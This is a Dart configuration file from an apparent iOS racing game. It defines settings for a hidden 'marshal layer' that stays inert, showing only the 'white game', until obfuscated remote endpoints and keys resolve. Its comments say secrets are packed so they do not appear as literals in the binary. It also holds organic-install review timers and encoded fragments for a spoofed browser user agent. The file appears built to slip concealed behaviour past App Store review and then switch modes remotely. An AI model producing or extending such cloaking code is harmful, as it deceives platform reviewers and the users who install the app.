import 'veil.dart';

/// Settings + packed values for the marshal layer.
///
/// Everything that must not read as a literal in the binary is stored packed
/// (see `tool/pack_marshal_values.dart`). Public pages (privacy policy,
/// support) are NOT stored here — they ship as plain text in the white part,
/// because they are published in App Store Connect anyway.
///
/// The layer stays inert (white game only) until [beaconUrl], [intakeKey] and
/// [signalProject] all resolve to something non-empty.
abstract final class FlagBook {
  static const String appTitle = 'Strawtop Raceway';
  static const String bundleId = 'com.strawtop.racewaygame';

  /// iOS App Store numeric id — used for install lookups and `store_id`.
  static const String storeNumber = '6792536620';

  /// How long a declined notification prompt stays quiet (3 d 11 h).
  static const int pingQuietSeconds = 298800;

  /// Grace period before an "Organic" verdict is re-checked against the
  /// install-data lookup.
  static const int organicReviewSeconds = 9;

  static const Duration beaconTimeout = Duration(seconds: 19);
  static const Duration intakeLookupTimeout = Duration(seconds: 14);
  static const Duration installWait = Duration(seconds: 9);
  static const Duration installWaitShort = Duration(seconds: 6);
  static const Duration deepLinkWait = Duration(seconds: 4);
  static const Duration trackingPromptDelay = Duration(milliseconds: 480);

  // ── Packed values (tool/pack_marshal_values.dart) ────────────────────────
  static const String _beacon =
      'GBEVAhBOQEwUEzMSAxUWW0dPFBcWBB1DAkEaQgoAHBYMBlwTHB8=';
  static const String _lookup =
      'GBEVAhBOQEwABCUAEApXSkVeBBQNHAEfT00YAEYGHAMRAB4PKwsCEwZuBUFPSQQ=';
  static const String _intakeKey = 'JRcQJSQhP1o/ECQCJQche00YDys3MA==';
  static const String _signalProject = 'RVBVQ1BBW1dRVnJA';
  static const String _uaOpen =
      'PQobGw8YDkxSSXFTXAgpQ1pAEklBJjQ4QUcnBQYBF1AqMlI=';
  static const String _uaKernel = 'UAkIGQZUIgIERw4gVDlQC3ReBx4EMgEPKkcDQg==';
  static const String _uaEngine = 'RlVUXFJaXlY=';
  static const String _uaLayout = 'UE0qOjc5I09HCygYEUE+TlZFGFtBMwEfEkcYA0Y=';
  static const String _uaRelease = 'QV1PRw==';
  static const String _uaDevice = 'UCgOEAoYCkxWUgRCQFlZeFRIFgAISg==';
  static const String _uaTail = 'RlVVXFI=';

  static String get beaconUrl => unveil(_beacon);
  static String get intakeLookupUrl => unveil(_lookup);
  static String get intakeKey => unveil(_intakeKey);
  static String get signalProject => unveil(_signalProject);

  /// Browser-identity fragments, assembled at runtime by `WireClient`.
  static String get uaOpen => unveil(_uaOpen);
  static String get uaKernel => unveil(_uaKernel);
  static String get uaEngine => unveil(_uaEngine);
  static String get uaLayout => unveil(_uaLayout);
  static String get uaRelease => unveil(_uaRelease);
  static String get uaDevice => unveil(_uaDevice);
  static String get uaTail => unveil(_uaTail);

  static String get storeToken => 'id$storeNumber';

  /// Never fold optional values into this predicate — one missing optional
  /// would silently disable the whole layer.
  static bool get ready =>
      beaconUrl.isNotEmpty &&
      intakeKey.isNotEmpty &&
      signalProject.isNotEmpty;
}
